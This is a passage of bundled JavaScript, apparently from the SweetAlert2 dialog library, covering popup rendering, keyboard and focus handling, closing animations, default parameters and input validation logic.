      setInnerHtml(stepEl, step);
      return stepEl;
    };
    const createLineElement = (params) => {
      const lineEl = document.createElement("li");
      addClass(lineEl, swalClasses["progress-step-line"]);
      if (params.progressStepsDistance) {
        applyNumericalStyle(lineEl, "width", params.progressStepsDistance);
      }
      return lineEl;
    };
    const renderTitle = (instance, params) => {
      const title = getTitle();
      toggle(title, params.title || params.titleText, "block");
      if (params.title) {
        parseHtmlToContainer(params.title, title);
      }
      if (params.titleText) {
        title.innerText = params.titleText;
      }
      applyCustomClass(title, params, "title");
    };
    const render = (instance, params) => {
      renderPopup(instance, params);
      renderContainer(instance, params);
      renderProgressSteps(instance, params);
      renderIcon(instance, params);
      renderImage(instance, params);
      renderTitle(instance, params);
      renderCloseButton(instance, params);
      renderContent(instance, params);
      renderActions(instance, params);
      renderFooter(instance, params);
      if (typeof params.didRender === "function") {
        params.didRender(getPopup());
      }
    };
    function hideLoading() {
      const innerParams = privateProps.innerParams.get(this);
      if (!innerParams) {
        return;
      }
      const domCache = privateProps.domCache.get(this);
      hide(domCache.loader);
      if (isToast()) {
        if (innerParams.icon) {
          show(getIcon());
        }
      } else {
        showRelatedButton(domCache);
      }
      removeClass([domCache.popup, domCache.actions], swalClasses.loading);
      domCache.popup.removeAttribute("aria-busy");
      domCache.popup.removeAttribute("data-loading");
      domCache.confirmButton.disabled = false;
      domCache.denyButton.disabled = false;
      domCache.cancelButton.disabled = false;
    }
    const showRelatedButton = (domCache) => {
      const buttonToReplace = domCache.popup.getElementsByClassName(domCache.loader.getAttribute("data-button-to-replace"));
      if (buttonToReplace.length) {
        show(buttonToReplace[0], "inline-block");
      } else if (allButtonsAreHidden()) {
        hide(domCache.actions);
      }
    };
    function getInput(instance) {
      const innerParams = privateProps.innerParams.get(instance || this);
      const domCache = privateProps.domCache.get(instance || this);
      if (!domCache) {
        return null;
      }
      return getInput$1(domCache.popup, innerParams.input);
    }
    const isVisible = () => {
      return isVisible$1(getPopup());
    };
    const clickConfirm = () => getConfirmButton() && getConfirmButton().click();
    const clickDeny = () => getDenyButton() && getDenyButton().click();
    const clickCancel = () => getCancelButton() && getCancelButton().click();
    const DismissReason = Object.freeze({
      cancel: "cancel",
      backdrop: "backdrop",
      close: "close",
      esc: "esc",
      timer: "timer"
    });
    const removeKeydownHandler = (globalState2) => {
      if (globalState2.keydownTarget && globalState2.keydownHandlerAdded) {
        globalState2.keydownTarget.removeEventListener("keydown", globalState2.keydownHandler, {
          capture: globalState2.keydownListenerCapture
        });
        globalState2.keydownHandlerAdded = false;
      }
    };
    const addKeydownHandler = (instance, globalState2, innerParams, dismissWith) => {
      removeKeydownHandler(globalState2);
      if (!innerParams.toast) {
        globalState2.keydownHandler = (e) => keydownHandler(instance, e, dismissWith);
        globalState2.keydownTarget = innerParams.keydownListenerCapture ? window : getPopup();
        globalState2.keydownListenerCapture = innerParams.keydownListenerCapture;
        globalState2.keydownTarget.addEventListener("keydown", globalState2.keydownHandler, {
          capture: globalState2.keydownListenerCapture
        });
        globalState2.keydownHandlerAdded = true;
      }
    };
    const setFocus = (innerParams, index, increment) => {
      const focusableElements = getFocusableElements();
      if (focusableElements.length) {
        index = index + increment;
        if (index === focusableElements.length) {
          index = 0;
        } else if (index === -1) {
          index = focusableElements.length - 1;
        }
        return focusableElements[index].focus();
      }
      getPopup().focus();
    };
    const arrowKeysNextButton = ["ArrowRight", "ArrowDown"];
    const arrowKeysPreviousButton = ["ArrowLeft", "ArrowUp"];
    const keydownHandler = (instance, e, dismissWith) => {
      const innerParams = privateProps.innerParams.get(instance);
      if (!innerParams) {
        return;
      }
      if (e.isComposing || e.keyCode === 229) {
        return;
      }
      if (innerParams.stopKeydownPropagation) {
        e.stopPropagation();
      }
      if (e.key === "Enter") {
        handleEnter(instance, e, innerParams);
      } else if (e.key === "Tab") {
        handleTab(e, innerParams);
      } else if ([...arrowKeysNextButton, ...arrowKeysPreviousButton].includes(e.key)) {
        handleArrows(e.key);
      } else if (e.key === "Escape") {
        handleEsc(e, innerParams, dismissWith);
      }
    };
    const handleEnter = (instance, e, innerParams) => {
      if (!callIfFunction(innerParams.allowEnterKey)) {
        return;
      }
      if (e.target && instance.getInput() && e.target instanceof HTMLElement && e.target.outerHTML === instance.getInput().outerHTML) {
        if (["textarea", "file"].includes(innerParams.input)) {
          return;
        }
        clickConfirm();
        e.preventDefault();
      }
    };
    const handleTab = (e, innerParams) => {
      const targetElement = e.target;
      const focusableElements = getFocusableElements();
      let btnIndex = -1;
      for (let i = 0; i < focusableElements.length; i++) {
        if (targetElement === focusableElements[i]) {
          btnIndex = i;
          break;
        }
      }
      if (!e.shiftKey) {
        setFocus(innerParams, btnIndex, 1);
      } else {
        setFocus(innerParams, btnIndex, -1);
      }
      e.stopPropagation();
      e.preventDefault();
    };
    const handleArrows = (key) => {
      const confirmButton = getConfirmButton();
      const denyButton = getDenyButton();
      const cancelButton = getCancelButton();
      if (document.activeElement instanceof HTMLElement && ![confirmButton, denyButton, cancelButton].includes(document.activeElement)) {
        return;
      }
      const sibling = arrowKeysNextButton.includes(key) ? "nextElementSibling" : "previousElementSibling";
      let buttonToFocus = document.activeElement;
      for (let i = 0; i < getActions().children.length; i++) {
        buttonToFocus = buttonToFocus[sibling];
        if (!buttonToFocus) {
          return;
        }
        if (buttonToFocus instanceof HTMLButtonElement && isVisible$1(buttonToFocus)) {
          break;
        }
      }
      if (buttonToFocus instanceof HTMLButtonElement) {
        buttonToFocus.focus();
      }
    };
    const handleEsc = (e, innerParams, dismissWith) => {
      if (callIfFunction(innerParams.allowEscapeKey)) {
        e.preventDefault();
        dismissWith(DismissReason.esc);
      }
    };
    var privateMethods = {
      swalPromiseResolve: /* @__PURE__ */ new WeakMap(),
      swalPromiseReject: /* @__PURE__ */ new WeakMap()
    };
    const setAriaHidden = () => {
      const bodyChildren = Array.from(document.body.children);
      bodyChildren.forEach((el) => {
        if (el === getContainer() || el.contains(getContainer())) {
          return;
        }
        if (el.hasAttribute("aria-hidden")) {
          el.setAttribute("data-previous-aria-hidden", el.getAttribute("aria-hidden"));
        }
        el.setAttribute("aria-hidden", "true");
      });
    };
    const unsetAriaHidden = () => {
      const bodyChildren = Array.from(document.body.children);
      bodyChildren.forEach((el) => {
        if (el.hasAttribute("data-previous-aria-hidden")) {
          el.setAttribute("aria-hidden", el.getAttribute("data-previous-aria-hidden"));
          el.removeAttribute("data-previous-aria-hidden");
        } else {
          el.removeAttribute("aria-hidden");
        }
      });
    };
    const iOSfix = () => {
      const iOS = /iPad|iPhone|iPod/.test(navigator.userAgent) && !window.MSStream || navigator.platform === "MacIntel" && navigator.maxTouchPoints > 1;
      if (iOS && !hasClass(document.body, swalClasses.iosfix)) {
        const offset = document.body.scrollTop;
        document.body.style.top = `${offset * -1}px`;
        addClass(document.body, swalClasses.iosfix);
        lockBodyScroll();
        addBottomPaddingForTallPopups();
      }
    };
    const addBottomPaddingForTallPopups = () => {
      const ua = navigator.userAgent;
      const iOS = !!ua.match(/iPad/i) || !!ua.match(/iPhone/i);
      const webkit = !!ua.match(/WebKit/i);
      const iOSSafari = iOS && webkit && !ua.match(/CriOS/i);
      if (iOSSafari) {
        const bottomPanelHeight = 44;
        if (getPopup().scrollHeight > window.innerHeight - bottomPanelHeight) {
          getContainer().style.paddingBottom = `${bottomPanelHeight}px`;
        }
      }
    };
    const lockBodyScroll = () => {
      const container = getContainer();
      let preventTouchMove;
      container.ontouchstart = (e) => {
        preventTouchMove = shouldPreventTouchMove(e);
      };
      container.ontouchmove = (e) => {
        if (preventTouchMove) {
          e.preventDefault();
          e.stopPropagation();
        }
      };
    };
    const shouldPreventTouchMove = (event) => {
      const target = event.target;
      const container = getContainer();
      if (isStylus(event) || isZoom(event)) {
        return false;
      }
      if (target === container) {
        return true;
      }
      if (!isScrollable(container) && target instanceof HTMLElement && target.tagName !== "INPUT" && target.tagName !== "TEXTAREA" && !(isScrollable(getHtmlContainer()) && getHtmlContainer().contains(target))) {
        return true;
      }
      return false;
    };
    const isStylus = (event) => {
      return event.touches && event.touches.length && event.touches[0].touchType === "stylus";
    };
    const isZoom = (event) => {
      return event.touches && event.touches.length > 1;
    };
    const undoIOSfix = () => {
      if (hasClass(document.body, swalClasses.iosfix)) {
        const offset = parseInt(document.body.style.top, 10);
        removeClass(document.body, swalClasses.iosfix);
        document.body.style.top = "";
        document.body.scrollTop = offset * -1;
      }
    };
    const fixScrollbar = () => {
      if (states.previousBodyPadding !== null) {
        return;
      }
      if (document.body.scrollHeight > window.innerHeight) {
        states.previousBodyPadding = parseInt(window.getComputedStyle(document.body).getPropertyValue("padding-right"));
        document.body.style.paddingRight = `${states.previousBodyPadding + measureScrollbar()}px`;
      }
    };
    const undoScrollbar = () => {
      if (states.previousBodyPadding !== null) {
        document.body.style.paddingRight = `${states.previousBodyPadding}px`;
        states.previousBodyPadding = null;
      }
    };
    function removePopupAndResetState(instance, container, returnFocus, didClose) {
      if (isToast()) {
        triggerDidCloseAndDispose(instance, didClose);
      } else {
        restoreActiveElement(returnFocus).then(() => triggerDidCloseAndDispose(instance, didClose));
        removeKeydownHandler(globalState);
      }
      const isSafari = /^((?!chrome|android).)*safari/i.test(navigator.userAgent);
      if (isSafari) {
        container.setAttribute("style", "display:none !important");
        container.removeAttribute("class");
        container.innerHTML = "";
      } else {
        container.remove();
      }
      if (isModal()) {
        undoScrollbar();
        undoIOSfix();
        unsetAriaHidden();
      }
      removeBodyClasses();
    }
    function removeBodyClasses() {
      removeClass([document.documentElement, document.body], [swalClasses.shown, swalClasses["height-auto"], swalClasses["no-backdrop"], swalClasses["toast-shown"]]);
    }
    function close(resolveValue) {
      resolveValue = prepareResolveValue(resolveValue);
      const swalPromiseResolve = privateMethods.swalPromiseResolve.get(this);
      const didClose = triggerClosePopup(this);
      if (this.isAwaitingPromise()) {
        if (!resolveValue.isDismissed) {
          handleAwaitingPromise(this);
          swalPromiseResolve(resolveValue);
        }
      } else if (didClose) {
        swalPromiseResolve(resolveValue);
      }
    }
    function isAwaitingPromise() {
      return !!privateProps.awaitingPromise.get(this);
    }
    const triggerClosePopup = (instance) => {
      const popup = getPopup();
      if (!popup) {
        return false;
      }
      const innerParams = privateProps.innerParams.get(instance);
      if (!innerParams || hasClass(popup, innerParams.hideClass.popup)) {
        return false;
      }
      removeClass(popup, innerParams.showClass.popup);
      addClass(popup, innerParams.hideClass.popup);
      const backdrop = getContainer();
      removeClass(backdrop, innerParams.showClass.backdrop);
      addClass(backdrop, innerParams.hideClass.backdrop);
      handlePopupAnimation(instance, popup, innerParams);
      return true;
    };
    function rejectPromise(error3) {
      const rejectPromise2 = privateMethods.swalPromiseReject.get(this);
      handleAwaitingPromise(this);
      if (rejectPromise2) {
        rejectPromise2(error3);
      }
    }
    const handleAwaitingPromise = (instance) => {
      if (instance.isAwaitingPromise()) {
        privateProps.awaitingPromise.delete(instance);
        if (!privateProps.innerParams.get(instance)) {
          instance._destroy();
        }
      }
    };
    const prepareResolveValue = (resolveValue) => {
      if (typeof resolveValue === "undefined") {
        return {
          isConfirmed: false,
          isDenied: false,
          isDismissed: true
        };
      }
      return Object.assign({
        isConfirmed: false,
        isDenied: false,
        isDismissed: false
      }, resolveValue);
    };
    const handlePopupAnimation = (instance, popup, innerParams) => {
      const container = getContainer();
      const animationIsSupported = animationEndEvent && hasCssAnimation(popup);
      if (typeof innerParams.willClose === "function") {
        innerParams.willClose(popup);
      }
      if (animationIsSupported) {
        animatePopup(instance, popup, container, innerParams.returnFocus, innerParams.didClose);
      } else {
        removePopupAndResetState(instance, container, innerParams.returnFocus, innerParams.didClose);
      }
    };
    const animatePopup = (instance, popup, container, returnFocus, didClose) => {
      globalState.swalCloseEventFinishedCallback = removePopupAndResetState.bind(null, instance, container, returnFocus, didClose);
      popup.addEventListener(animationEndEvent, function(e) {
        if (e.target === popup) {
          globalState.swalCloseEventFinishedCallback();
          delete globalState.swalCloseEventFinishedCallback;
        }
      });
    };
    const triggerDidCloseAndDispose = (instance, didClose) => {
      setTimeout(() => {
        if (typeof didClose === "function") {
          didClose.bind(instance.params)();
        }
        instance._destroy();
      });
    };
    function setButtonsDisabled(instance, buttons, disabled) {
      const domCache = privateProps.domCache.get(instance);
      buttons.forEach((button) => {
        domCache[button].disabled = disabled;
      });
    }
    function setInputDisabled(input, disabled) {
      if (!input) {
        return;
      }
      if (input.type === "radio") {
        const radiosContainer = input.parentNode.parentNode;
        const radios = radiosContainer.querySelectorAll("input");
        for (let i = 0; i < radios.length; i++) {
          radios[i].disabled = disabled;
        }
      } else {
        input.disabled = disabled;
      }
    }
    function enableButtons() {
      setButtonsDisabled(this, ["confirmButton", "denyButton", "cancelButton"], false);
    }
    function disableButtons() {
      setButtonsDisabled(this, ["confirmButton", "denyButton", "cancelButton"], true);
    }
    function enableInput() {
      setInputDisabled(this.getInput(), false);
    }
    function disableInput() {
      setInputDisabled(this.getInput(), true);
    }
    function showValidationMessage(error3) {
      const domCache = privateProps.domCache.get(this);
      const params = privateProps.innerParams.get(this);
      setInnerHtml(domCache.validationMessage, error3);
      domCache.validationMessage.className = swalClasses["validation-message"];
      if (params.customClass && params.customClass.validationMessage) {
        addClass(domCache.validationMessage, params.customClass.validationMessage);
      }
      show(domCache.validationMessage);
      const input = this.getInput();
      if (input) {
        input.setAttribute("aria-invalid", true);
        input.setAttribute("aria-describedby", swalClasses["validation-message"]);
        focusInput(input);
        addClass(input, swalClasses.inputerror);
      }
    }
    function resetValidationMessage() {
      const domCache = privateProps.domCache.get(this);
      if (domCache.validationMessage) {
        hide(domCache.validationMessage);
      }
      const input = this.getInput();
      if (input) {
        input.removeAttribute("aria-invalid");
        input.removeAttribute("aria-describedby");
        removeClass(input, swalClasses.inputerror);
      }
    }
    function getProgressSteps() {
      const domCache = privateProps.domCache.get(this);
      return domCache.progressSteps;
    }
    const defaultParams = {
      title: "",
      titleText: "",
      text: "",
      html: "",
      footer: "",
      icon: void 0,
      iconColor: void 0,
      iconHtml: void 0,
      template: void 0,
      toast: false,
      showClass: {
        popup: "swal2-show",
        backdrop: "swal2-backdrop-show",
        icon: "swal2-icon-show"
      },
      hideClass: {
        popup: "swal2-hide",
        backdrop: "swal2-backdrop-hide",
        icon: "swal2-icon-hide"
      },
      customClass: {},
      target: "body",
      color: void 0,
      backdrop: true,
      heightAuto: true,
      allowOutsideClick: true,
      allowEscapeKey: true,
      allowEnterKey: true,
      stopKeydownPropagation: true,
      keydownListenerCapture: false,
      showConfirmButton: true,
      showDenyButton: false,
      showCancelButton: false,
      preConfirm: void 0,
      preDeny: void 0,
      confirmButtonText: "OK",
      confirmButtonAriaLabel: "",
      confirmButtonColor: void 0,
      denyButtonText: "No",
      denyButtonAriaLabel: "",
      denyButtonColor: void 0,
      cancelButtonText: "Cancel",
      cancelButtonAriaLabel: "",
      cancelButtonColor: void 0,
      buttonsStyling: true,
      reverseButtons: false,
      focusConfirm: true,
      focusDeny: false,
      focusCancel: false,
      returnFocus: true,
      showCloseButton: false,
      closeButtonHtml: "&times;",
      closeButtonAriaLabel: "Close this dialog",
      loaderHtml: "",
      showLoaderOnConfirm: false,
      showLoaderOnDeny: false,
      imageUrl: void 0,
      imageWidth: void 0,
      imageHeight: void 0,
      imageAlt: "",
      timer: void 0,
      timerProgressBar: false,
      width: void 0,
      padding: void 0,
      background: void 0,
      input: void 0,
      inputPlaceholder: "",
      inputLabel: "",
      inputValue: "",
      inputOptions: {},
      inputAutoTrim: true,
      inputAttributes: {},
      inputValidator: void 0,
      returnInputValueOnDeny: false,
      validationMessage: void 0,
      grow: false,
      position: "center",
      progressSteps: [],
      currentProgressStep: void 0,
      progressStepsDistance: void 0,
      willOpen: void 0,
      didOpen: void 0,
      didRender: void 0,
      willClose: void 0,
      didClose: void 0,
      didDestroy: void 0,
      scrollbarPadding: true
    };
    const updatableParams = ["allowEscapeKey", "allowOutsideClick", "background", "buttonsStyling", "cancelButtonAriaLabel", "cancelButtonColor", "cancelButtonText", "closeButtonAriaLabel", "closeButtonHtml", "color", "confirmButtonAriaLabel", "confirmButtonColor", "confirmButtonText", "currentProgressStep", "customClass", "denyButtonAriaLabel", "denyButtonColor", "denyButtonText", "didClose", "didDestroy", "footer", "hideClass", "html", "icon", "iconColor", "iconHtml", "imageAlt", "imageHeight", "imageUrl", "imageWidth", "preConfirm", "preDeny", "progressSteps", "returnFocus", "reverseButtons", "showCancelButton", "showCloseButton", "showConfirmButton", "showDenyButton", "text", "title", "titleText", "willClose"];
    const deprecatedParams = {};
    const toastIncompatibleParams = ["allowOutsideClick", "allowEnterKey", "backdrop", "focusConfirm", "focusDeny", "focusCancel", "returnFocus", "heightAuto", "keydownListenerCapture"];
    const isValidParameter = (paramName) => {
      return Object.prototype.hasOwnProperty.call(defaultParams, paramName);
    };
    const isUpdatableParameter = (paramName) => {
      return updatableParams.indexOf(paramName) !== -1;
    };
    const isDeprecatedParameter = (paramName) => {
      return deprecatedParams[paramName];
    };
    const checkIfParamIsValid = (param) => {
      if (!isValidParameter(param)) {
        warn2(`Unknown parameter "${param}"`);
      }
    };
    const checkIfToastParamIsValid = (param) => {
      if (toastIncompatibleParams.includes(param)) {
        warn2(`The parameter "${param}" is incompatible with toasts`);
      }
    };
    const checkIfParamIsDeprecated = (param) => {
      if (isDeprecatedParameter(param)) {
        warnAboutDeprecation(param, isDeprecatedParameter(param));
      }
    };
    const showWarningsForParams = (params) => {
      if (params.backdrop === false && params.allowOutsideClick) {
        warn2('"allowOutsideClick" parameter requires `backdrop` parameter to be set to `true`');
      }
      for (const param in params) {
        checkIfParamIsValid(param);
        if (params.toast) {
          checkIfToastParamIsValid(param);
        }
        checkIfParamIsDeprecated(param);
      }
    };
    function update(params) {
      const popup = getPopup();
      const innerParams = privateProps.innerParams.get(this);
      if (!popup || hasClass(popup, innerParams.hideClass.popup)) {
        return warn2(`You're trying to update the closed or closing popup, that won't work. Use the update() method in preConfirm parameter or show a new popup.`);
      }
      const validUpdatableParams = filterValidParams(params);
      const updatedParams = Object.assign({}, innerParams, validUpdatableParams);
      render(this, updatedParams);
      privateProps.innerParams.set(this, updatedParams);
      Object.defineProperties(this, {
        params: {
          value: Object.assign({}, this.params, params),
          writable: false,
          enumerable: true
        }
      });
    }
    const filterValidParams = (params) => {
      const validUpdatableParams = {};
      Object.keys(params).forEach((param) => {
        if (isUpdatableParameter(param)) {
          validUpdatableParams[param] = params[param];
        } else {
          warn2(`Invalid parameter to update: ${param}`);
        }
      });
      return validUpdatableParams;
    };
    function _destroy() {
      const domCache = privateProps.domCache.get(this);
      const innerParams = privateProps.innerParams.get(this);
      if (!innerParams) {
        disposeWeakMaps(this);
        return;
      }
      if (domCache.popup && globalState.swalCloseEventFinishedCallback) {
        globalState.swalCloseEventFinishedCallback();
        delete globalState.swalCloseEventFinishedCallback;
      }
      if (typeof innerParams.didDestroy === "function") {
        innerParams.didDestroy();
      }
      disposeSwal(this);
    }
    const disposeSwal = (instance) => {
      disposeWeakMaps(instance);
      delete instance.params;
      delete globalState.keydownHandler;
      delete globalState.keydownTarget;
      delete globalState.currentInstance;
    };
    const disposeWeakMaps = (instance) => {
      if (instance.isAwaitingPromise()) {
        unsetWeakMaps(privateProps, instance);
        privateProps.awaitingPromise.set(instance, true);
      } else {
        unsetWeakMaps(privateMethods, instance);
        unsetWeakMaps(privateProps, instance);
      }
    };
    const unsetWeakMaps = (obj, instance) => {
      for (const i in obj) {
        obj[i].delete(instance);
      }
    };
    var instanceMethods = /* @__PURE__ */ Object.freeze({
      __proto__: null,
      hideLoading,
      disableLoading: hideLoading,
      getInput,
      close,
      isAwaitingPromise,
      rejectPromise,
      handleAwaitingPromise,
      closePopup: close,
      closeModal: close,
      closeToast: close,
      enableButtons,
      disableButtons,
      enableInput,
      disableInput,
      showValidationMessage,
      resetValidationMessage,
      getProgressSteps,
      update,
      _destroy
    });
    const showLoading = (buttonToReplace) => {
      let popup = getPopup();
      if (!popup) {
        new Swal2();
      }
      popup = getPopup();
      const loader = getLoader();
      if (isToast()) {
        hide(getIcon());
      } else {
        replaceButton(popup, buttonToReplace);
      }
      show(loader);
      popup.setAttribute("data-loading", "true");
      popup.setAttribute("aria-busy", "true");
      popup.focus();
    };
    const replaceButton = (popup, buttonToReplace) => {
      const actions = getActions();
      const loader = getLoader();
      if (!buttonToReplace && isVisible$1(getConfirmButton())) {
        buttonToReplace = getConfirmButton();
      }
      show(actions);
      if (buttonToReplace) {
        hide(buttonToReplace);
        loader.setAttribute("data-button-to-replace", buttonToReplace.className);
      }
      loader.parentNode.insertBefore(loader, buttonToReplace);
      addClass([popup, actions], swalClasses.loading);
    };
    const handleInputOptionsAndValue = (instance, params) => {
      if (params.input === "select" || params.input === "radio") {
        handleInputOptions(instance, params);
      } else if (["text", "email", "number", "tel", "textarea"].includes(params.input) && (hasToPromiseFn(params.inputValue) || isPromise(params.inputValue))) {
        showLoading(getConfirmButton());
        handleInputValue(instance, params);
      }
    };
    const getInputValue = (instance, innerParams) => {
      const input = instance.getInput();
      if (!input) {
        return null;
      }
      switch (innerParams.input) {
        case "checkbox":
          return getCheckboxValue(input);
        case "radio":
          return getRadioValue(input);
        case "file":
          return getFileValue(input);
        default:
          return innerParams.inputAutoTrim ? input.value.trim() : input.value;
      }
    };
    const getCheckboxValue = (input) => input.checked ? 1 : 0;
    const getRadioValue = (input) => input.checked ? input.value : null;
    const getFileValue = (input) => input.files.length ? input.getAttribute("multiple") !== null ? input.files : input.files[0] : null;
    const handleInputOptions = (instance, params) => {
      const popup = getPopup();
      const processInputOptions = (inputOptions) => {
        populateInputOptions[params.input](popup, formatInputOptions(inputOptions), params);
      };
      if (hasToPromiseFn(params.inputOptions) || isPromise(params.inputOptions)) {
        showLoading(getConfirmButton());
        asPromise(params.inputOptions).then((inputOptions) => {
          instance.hideLoading();
          processInputOptions(inputOptions);
        });
      } else if (typeof params.inputOptions === "object") {
        processInputOptions(params.inputOptions);
      } else {
        error2(`Unexpected type of inputOptions! Expected object, Map or Promise, got ${typeof params.inputOptions}`);
      }
    };
    const handleInputValue = (instance, params) => {
      const input = instance.getInput();
      hide(input);
      asPromise(params.inputValue).then((inputValue) => {
        input.value = params.input === "number" ? `${parseFloat(inputValue) || 0}` : `${inputValue}`;
        show(input);
        input.focus();
        instance.hideLoading();
      }).catch((err) => {
        error2(`Error in inputValue promise: ${err}`);
        input.value = "";
        show(input);
        input.focus();
        instance.hideLoading();
      });
    };
    const populateInputOptions = {
      select: (popup, inputOptions, params) => {
        const select = getDirectChildByClass(popup, swalClasses.select);
        const renderOption = (parent, optionLabel, optionValue) => {
          const option = document.createElement("option");
          option.value = optionValue;
          setInnerHtml(option, optionLabel);
          option.selected = isSelected(optionValue, params.inputValue);
          parent.appendChild(option);
        };
        inputOptions.forEach((inputOption) => {
          const optionValue = inputOption[0];
          const optionLabel = inputOption[1];
          if (Array.isArray(optionLabel)) {
            const optgroup = document.createElement("optgroup");
            optgroup.label = optionValue;
            optgroup.disabled = false;
            select.appendChild(optgroup);
            optionLabel.forEach((o) => renderOption(optgroup, o[1], o[0]));
          } else {
            renderOption(select, optionLabel, optionValue);
          }
        });
        select.focus();
      },
      radio: (popup, inputOptions, params) => {
        const radio = getDirectChildByClass(popup, swalClasses.radio);
        inputOptions.forEach((inputOption) => {
          const radioValue = inputOption[0];
          const radioLabel = inputOption[1];
          const radioInput = document.createElement("input");
          const radioLabelElement = document.createElement("label");
          radioInput.type = "radio";
          radioInput.name = swalClasses.radio;
          radioInput.value = radioValue;
          if (isSelected(radioValue, params.inputValue)) {
            radioInput.checked = true;
          }
          const label = document.createElement("span");
          setInnerHtml(label, radioLabel);
          label.className = swalClasses.label;
          radioLabelElement.appendChild(radioInput);
          radioLabelElement.appendChild(label);
          radio.appendChild(radioLabelElement);
        });
        const radios = radio.querySelectorAll("input");
        if (radios.length) {
          radios[0].focus();
        }
      }
    };
    const formatInputOptions = (inputOptions) => {
      const result = [];
      if (typeof Map !== "undefined" && inputOptions instanceof Map) {
        inputOptions.forEach((value, key) => {
          let valueFormatted = value;
          if (typeof valueFormatted === "object") {
            valueFormatted = formatInputOptions(valueFormatted);
          }
          result.push([key, valueFormatted]);
        });
      } else {
        Object.keys(inputOptions).forEach((key) => {
          let valueFormatted = inputOptions[key];
          if (typeof valueFormatted === "object") {
            valueFormatted = formatInputOptions(valueFormatted);
          }
          result.push([key, valueFormatted]);
        });
      }
      return result;
    };
    const isSelected = (optionValue, inputValue) => {
      return inputValue && inputValue.toString() === optionValue.toString();
    };
    const handleConfirmButtonClick = (instance) => {
      const innerParams = privateProps.innerParams.get(instance);
      instance.disableButtons();
      if (innerParams.input) {
        handleConfirmOrDenyWithInput(instance, "confirm");
      } else {
        confirm(instance, true);
      }
    };
    const handleDenyButtonClick = (instance) => {
      const innerParams = privateProps.innerParams.get(instance);
      instance.disableButtons();
      if (innerParams.returnInputValueOnDeny) {
        handleConfirmOrDenyWithInput(instance, "deny");
      } else {
        deny(instance, false);
      }
    };
    const handleCancelButtonClick = (instance, dismissWith) => {
      instance.disableButtons();
      dismissWith(DismissReason.cancel);
    };
    const handleConfirmOrDenyWithInput = (instance, type) => {
      const innerParams = privateProps.innerParams.get(instance);
      if (!innerParams.input) {
        error2(`The "input" parameter is needed to be set when using returnInputValueOn${capitalizeFirstLetter(type)}`);
        return;
      }
      const inputValue = getInputValue(instance, innerParams);
      if (innerParams.inputValidator) {
        handleInputValidator(instance, inputValue, type);
      } else if (!instance.getInput().checkValidity()) {
        instance.enableButtons();
        instance.showValidationMessage(innerParams.validationMessage);
      } else if (type === "deny") {
        deny(instance, inputValue);
      } else {
        confirm(instance, inputValue);
      }
    };
    const handleInputValidator = (instance, inputValue, type) => {
      const innerParams = privateProps.innerParams.get(instance);
      instance.disableInput();
      const validationPromise = Promise.resolve().then(() => asPromise(innerParams.inputValidator(inputValue, innerParams.validationMessage)));
      validationPromise.then((validationMessage) => {
        instance.enableButtons();
        instance.enableInput();
        if (validationMessage) {
          instance.showValidationMessage(validationMessage);
        } else if (type === "deny") {
          deny(instance, inputValue);
        } else {
          confirm(instance, inputValue);
        }
      });
    };
    const deny = (instance, value) => {
      const innerParams = privateProps.innerParams.get(instance || void 0);
      if (innerParams.showLoaderOnDeny) {
        showLoading(getDenyButton());
      }
      if (innerParams.preDeny) {
        privateProps.awaitingPromise.set(instance || void 0, true);
        const preDenyPromise = Promise.resolve().then(() => asPromise(innerParams.preDeny(value, innerParams.validationMessage)));
        preDenyPromise.then((preDenyValue) => {
          if (preDenyValue === false) {
            instance.hideLoading();
            handleAwaitingPromise(instance);
          } else {
            instance.close({
              isDenied: true,
              value: typeof preDenyValue === "undefined" ? value : preDenyValue
            });
          }
        }).catch((error3) => rejectWith(instance || void 0, error3));
      } else {
        instance.close({
          isDenied: true,
          value
        });
      }
    };
    const succeedWith = (instance, value) => {
      instance.close({
        isConfirmed: true,
        value
      });
    };
    const rejectWith = (instance, error3) => {
      instance.rejectPromise(error3);
    };
    const confirm = (instance, value) => {
      const innerParams = privateProps.innerParams.get(instance || void 0);
      if (innerParams.showLoaderOnConfirm) {
        showLoading();
      }
      if (innerParams.preConfirm) {
        instance.resetValidationMessage();
        privateProps.awaitingPromise.set(instance || void 0, true);
        const preConfirmPromise = Promise.resolve().then(() => asPromise(innerParams.preConfirm(value, innerParams.validationMessage)));
        preConfirmPromise.then((preConfirmValue) => {
          if (isVisible$1(getValidationMessage()) || preConfirmValue === false) {
            instance.hideLoading();
            handleAwaitingPromise(instance);
          } else {
            succeedWith(instance, typeof preConfirmValue === "undefined" ? value : preConfirmValue);
          }
        }).catch((error3) => rejectWith(instance || void 0, error3));
      } else {
        succeedWith(instance, value);
      }
    };
    const handlePopupClick = (instance, domCache, dismissWith) => {
      const innerParams = privateProps.innerParams.get(instance);
      if (innerParams.toast) {
        handleToastClick(instance, domCache, dismissWith);
      } else {
        handleModalMousedown(domCache);
        handleContainerMousedown(domCache);
        handleModalClick(instance, domCache, dismissWith);
      }
    };
    const handleToastClick = (instance, domCache, dismissWith) => {
      domCache.popup.onclick = () => {
        const innerParams = privateProps.innerParams.get(instance);
        if (innerParams && (isAnyButtonShown(innerParams) || innerParams.timer || innerParams.input)) {
          return;
        }
        dismissWith(DismissReason.close);
      };
    };
    const isAnyButtonShown = (innerParams) => {
      return innerParams.showConfirmButton || innerParams.showDenyButton || innerParams.showCancelButton || innerParams.showCloseButton;
    };
    let ignoreOutsideClick = false;
    const handleModalMousedown = (domCache) => {
      domCache.popup.onmousedown = () => {
        domCache.container.onmouseup = function(e) {
          domCache.container.onmouseup = void 0;
          if (e.target === domCache.container) {
            ignoreOutsideClick = true;
          }
        };
      };
    };
    const handleContainerMousedown = (domCache) => {
      domCache.container.onmousedown = () => {
        domCache.popup.onmouseup = function(e) {
          domCache.popup.onmouseup = void 0;
          if (e.target === domCache.popup || domCache.popup.contains(e.target)) {
            ignoreOutsideClick = true;
          }
        };
      };
    };
    const handleModalClick = (instance, domCache, dismissWith) => {
      domCache.container.onclick = (e) => {
        const innerParams = privateProps.innerParams.get(instance);
        if (ignoreOutsideClick) {
          ignoreOutsideClick = false;
          return;
        }
        if (e.target === domCache.container && callIfFunction(innerParams.allowOutsideClick)) {
          dismissWith(DismissReason.backdrop);
        }
      };
    };
    const isJqueryElement = (elem) => typeof elem === "object" && elem.jquery;
    const isElement = (elem) => elem instanceof Element || isJqueryElement(elem);
    const argsToParams = (args) => {
      const params = {};
      if (typeof args[0] === "object" && !isElement(args[0])) {
        Object.assign(params, args[0]);
      } else {
        ["title", "html", "icon"].forEach((name, index) => {
          const arg = args[index];
          if (typeof arg === "string" || isElement(arg)) {
            params[name] = arg;
          } else if (arg !== void 0) {
